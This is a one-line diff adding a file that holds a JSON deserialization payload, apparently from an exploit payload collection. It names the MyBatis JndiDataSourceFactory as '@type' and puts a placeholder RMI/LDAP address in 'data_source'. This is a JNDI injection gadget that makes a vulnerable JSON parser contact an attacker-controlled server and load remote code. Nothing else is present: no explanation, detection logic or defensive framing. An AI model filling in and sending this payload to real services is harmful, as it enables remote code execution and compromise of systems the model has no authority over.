@@ -1,0 +1,1 @@
+{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"###RMI_LDAP_ADDRESS###"}}
